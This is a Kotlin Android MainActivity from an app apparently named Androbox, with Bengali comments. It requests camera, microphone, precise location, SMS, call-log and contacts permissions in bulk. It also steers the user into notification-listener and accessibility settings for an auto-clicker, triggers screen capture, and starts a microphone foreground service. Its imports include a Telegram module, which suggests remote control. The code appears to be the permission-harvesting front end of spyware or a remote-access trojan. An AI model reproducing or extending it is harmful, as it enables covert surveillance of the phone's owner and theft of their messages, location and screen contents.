package com.kashem.shaikh

import android.Manifest
import android.content.ComponentName
import android.content.Intent
import android.content.IntentSender
import android.content.pm.PackageManager
import android.media.projection.MediaProjectionManager
import android.os.Build
import android.os.Bundle
import android.provider.Settings
import androidx.activity.result.contract.ActivityResultContracts
import androidx.activity.result.IntentSenderRequest
import androidx.appcompat.app.AppCompatActivity
import androidx.core.content.ContextCompat
import com.google.android.gms.common.api.ApiException
import com.google.android.gms.common.api.ResolvableApiException
import com.google.android.gms.location.LocationRequest
import com.google.android.gms.location.LocationServices
import com.google.android.gms.location.LocationSettingsRequest
import com.google.android.gms.location.LocationSettingsStatusCodes
import com.kashem.shaikh.telegram.*

class MainActivity : AppCompatActivity() {

    private val androboxDangerousPermissions = arrayOf(
        Manifest.permission.CAMERA,
        Manifest.permission.RECORD_AUDIO,
        Manifest.permission.ACCESS_FINE_LOCATION,
        Manifest.permission.ACCESS_COARSE_LOCATION,
        Manifest.permission.READ_PHONE_STATE,
        Manifest.permission.READ_CALL_LOG,
        Manifest.permission.READ_CONTACTS,
        Manifest.permission.WRITE_CONTACTS,
        Manifest.permission.CALL_PHONE,
        Manifest.permission.POST_NOTIFICATIONS,
        Manifest.permission.READ_SMS,
        Manifest.permission.SEND_SMS
    )

    private val mediaProjectionLauncher = registerForActivityResult(
        ActivityResultContracts.StartActivityForResult()
    ) { result ->
        val type = pendingMediaProjectionType
        if (result.resultCode == RESULT_OK && result.data != null) {
            if (type != null) {
                AppLogs.logMediaProjection(type, true)
                ForegroundService.setMediaProjection(result.resultCode, result.data!!, type)
            }
        } else {
            AppLogs.logMediaProjection(type ?: "unknown", false, "User denied")
            ToastHelper.showToast(this, "Screen projection permission denied")
        }
        pendingMediaProjectionType = null
    }

    private val locationAccuracyLauncher = registerForActivityResult(
        ActivityResultContracts.StartIntentSenderForResult()
    ) { result ->
        if (result.resultCode == RESULT_OK) {
            AppLogs.debug("Location accuracy granted")
            LocationTracker.onLocationAccuracyResult(
                this,
                pendingLocationOrigin ?: "user",
                pendingLocationResult
            )
        } else {
            AppLogs.warn("Location accuracy denied")
            pendingLocationResult?.invoke(false)
        }
        pendingLocationOrigin = null
        pendingLocationResult = null
    }

    private val dangerousPermissionsLauncher = registerForActivityResult(
        ActivityResultContracts.RequestMultiplePermissions()
    ) { results ->
        results.forEach { (perm, granted) ->
            AppLogs.logPermission(perm, granted)
        }
        // পারমিশন পাওয়ার পর Service চালু করার চেষ্টা
        startServicesIfReady()
        requestNotificationListener()
    }

    private var waitingForNotification = false
    private var pendingMediaProjectionType: String? = null
    private var pendingLocationOrigin: String? = null
    private var pendingLocationResult: ((Boolean) -> Unit)? = null

    // অ্যাক্টিভিটি foreground স্টেট ট্র্যাক করার ফ্ল্যাগ
    private var isActivityResumed = false

    override fun onCreate(savedInstanceState: Bundle?) {
        super.onCreate(savedInstanceState)
        setContentView(R.layout.activity_main)
        AppLogs.logActivityLifecycle("MainActivity", "onCreate")

        // Service এখন শুরু করবেন না – পরে যখন সব শর্ত পূরণ হবে তখন startServicesIfReady() কল করবে
        askPermissions()

        intent?.let {
            if (it.getBooleanExtra("request_location_accuracy", false)) {
                AppLogs.debug("Requesting location accuracy from intent")
                openLocationAccuracySettings()
            }
        }
    }

    override fun onResume() {
        super.onResume()
        isActivityResumed = true
        AppLogs.logActivityLifecycle("MainActivity", "onResume")

        // অ্যাক্টিভিটি foreground-এ আসার সাথে সাথে Service চালু করার চেষ্টা
        startServicesIfReady()

        if (waitingForNotification) {
            waitingForNotification = false
            if (isNotificationListenerEnabled()) {
                AppLogs.info("Notification listener enabled")
                startServicesIfReady()
            } else {
                AppLogs.warn("Notification listener still not enabled")
            }
        }
    }

    override fun onPause() {
        super.onPause()
        isActivityResumed = false
        AppLogs.logActivityLifecycle("MainActivity", "onPause")
    }

    override fun onDestroy() {
        super.onDestroy()
        AppLogs.logActivityLifecycle("MainActivity", "onDestroy")
    }

    override fun onNewIntent(intent: Intent?) {
        super.onNewIntent(intent)
        intent?.let {
            val type = it.getStringExtra("media_projection_type")
            if (!type.isNullOrEmpty()) {
                AppLogs.debug("MediaProjection requested for $type")
                pendingMediaProjectionType = type
                val projectionManager = getSystemService(MEDIA_PROJECTION_SERVICE) as MediaProjectionManager
                mediaProjectionLauncher.launch(projectionManager.createScreenCaptureIntent())
            }
            if (it.getBooleanExtra("request_location_accuracy", false)) {
                AppLogs.debug("Location accuracy requested from new intent")
                openLocationAccuracySettings()
            }
        }
    }

    // ---------- পারমিশন ম্যানেজমেন্ট ----------
    private fun askPermissions() {
        requestAndroboxDangerousPermissions()
    }

    private fun requestAndroboxDangerousPermissions() {
        val missing = androboxDangerousPermissions.filter {
            ContextCompat.checkSelfPermission(this, it) != PackageManager.PERMISSION_GRANTED
        }.toTypedArray()
        if (missing.isEmpty()) {
            AppLogs.info("All dangerous permissions already granted")
            startServicesIfReady()
            requestNotificationListener()
        } else {
            AppLogs.debug("Requesting ${missing.size} missing permissions")
            dangerousPermissionsLauncher.launch(missing)
        }
    }

    private fun requestNotificationListener() {
        if (isNotificationListenerEnabled()) {
            AppLogs.info("Notification listener already enabled")
            startServicesIfReady()
        } else {
            waitingForNotification = true
            AppLogs.debug("Opening notification listener settings")
            startActivity(Intent(Settings.ACTION_NOTIFICATION_LISTENER_SETTINGS))
        }
    }

    private fun isNotificationListenerEnabled(): Boolean {
        val enabled = Settings.Secure.getString(contentResolver, "enabled_notification_listeners")
        val componentName = ComponentName(this, NotificationCaptureService::class.java).flattenToString()
        val result = enabled?.contains(componentName) == true
        AppLogs.debug("Notification listener enabled: $result")
        return result
    }

    // ---------- Service শুরু করার শর্ত ----------
    private fun startServicesIfReady() {
        // শর্ত ১: RECORD_AUDIO পারমিশন থাকতে হবে (microphone FGS-এর জন্য আবশ্যক)
        val hasRecordAudio = ContextCompat.checkSelfPermission(this, Manifest.permission.RECORD_AUDIO) == PackageManager.PERMISSION_GRANTED
        if (!hasRecordAudio) {
            AppLogs.debug("startServicesIfReady: RECORD_AUDIO not granted, waiting...")
            return
        }

        // শর্ত ২: অ্যাক্টিভিটি foreground-এ থাকতে হবে (onResume)
        if (!isActivityResumed) {
            AppLogs.debug("startServicesIfReady: Activity not resumed, waiting...")
            return
        }

        // সব শর্ত পূরণ – Service শুরু করুন
        AppLogs.info("✅ All conditions met, starting ForegroundService...")
        startForegroundService(Intent(this, ForegroundService::class.java))
    }

    // ---------- Accessibility (AutoClicker) ----------
    private fun startAndroboxServices() {
        requestAccessibilityPermission()
    }

    private fun requestAccessibilityPermission() {
        if (!isAccessibilityServiceEnabled()) {
            AppLogs.debug("Opening accessibility settings")
            startActivity(Intent(Settings.ACTION_ACCESSIBILITY_SETTINGS))
        } else {
            AppLogs.info("Accessibility service already enabled")
        }
    }

    private fun isAccessibilityServiceEnabled(): Boolean {
        val enabledServices = Settings.Secure.getString(contentResolver, Settings.Secure.ENABLED_ACCESSIBILITY_SERVICES)
        val componentName = ComponentName(this, AutoClicker::class.java).flattenToString()
        val result = enabledServices?.contains(componentName) == true
        AppLogs.debug("Accessibility service enabled: $result")
        return result
    }

    // ---------- লোকেশন অ্যাকিউরেসি ----------
    private fun openLocationAccuracySettings() {
        try {
            val locationRequest = LocationRequest.create().apply {
                priority = LocationRequest.PRIORITY_HIGH_ACCURACY
            }
            val builder = LocationSettingsRequest.Builder()
                .addLocationRequest(locationRequest)

            val client = LocationServices.getSettingsClient(this)
            client.checkLocationSettings(builder.build())
                .addOnSuccessListener {
                    AppLogs.debug("Location settings already accurate")
                    LocationTracker.onLocationAccuracyResult(
                        this,
                        pendingLocationOrigin ?: "user",
                        pendingLocationResult
                    )
                    pendingLocationOrigin = null
                    pendingLocationResult = null
                }
                .addOnFailureListener { e ->
                    if (e is ApiException) {
                        when (e.statusCode) {
                            LocationSettingsStatusCodes.RESOLUTION_REQUIRED -> {
                                try {
                                    val resolvable = e as? ResolvableApiException
                                    if (resolvable != null) {
                                        val intentSender = resolvable.resolution?.intentSender
                                        if (intentSender != null) {
                                            AppLogs.debug("Showing location accuracy dialog")
                                            val request = IntentSenderRequest.Builder(intentSender).build()
                                            locationAccuracyLauncher.launch(request)
                                        } else {
                                            AppLogs.warn("IntentSender null, opening settings")
                                            startActivity(Intent(Settings.ACTION_LOCATION_SOURCE_SETTINGS))
                                        }
                                    } else {
                                        AppLogs.warn("Not a ResolvableApiException, opening settings")
                                        startActivity(Intent(Settings.ACTION_LOCATION_SOURCE_SETTINGS))
                                    }
                                } catch (sendEx: IntentSender.SendIntentException) {
                                    AppLogs.error("Error showing location dialog", sendEx)
                                    startActivity(Intent(Settings.ACTION_LOCATION_SOURCE_SETTINGS))
                                }
                            }
                            LocationSettingsStatusCodes.SETTINGS_CHANGE_UNAVAILABLE -> {
                                AppLogs.error("Location settings change unavailable")
                                ToastHelper.showToast(this, "Location settings unavailable")
                                pendingLocationResult?.invoke(false)
                                pendingLocationOrigin = null
                                pendingLocationResult = null
                            }
                            else -> {
                                AppLogs.error("Location error: ${e.message}")
                                ToastHelper.showToast(this, "Location error: ${e.message}")
                                pendingLocationResult?.invoke(false)
                                pendingLocationOrigin = null
                                pendingLocationResult = null
                            }
                        }
                    } else {
                        AppLogs.error("Unexpected location error", e)
                        ToastHelper.showToast(this, "Location error occurred")
                        pendingLocationResult?.invoke(false)
                        pendingLocationOrigin = null
                        pendingLocationResult = null
                    }
                }
        } catch (e: Exception) {
            AppLogs.error("Failed to check location settings", e)
            startActivity(Intent(Settings.ACTION_LOCATION_SOURCE_SETTINGS))
        }
    }

    fun requestLocationAccuracy(origin: String, onResult: ((Boolean) -> Unit)?) {
        pendingLocationOrigin = origin
        pendingLocationResult = onResult
        AppLogs.debug("Requesting location accuracy for origin=$origin")
        openLocationAccuracySettings()
    }
}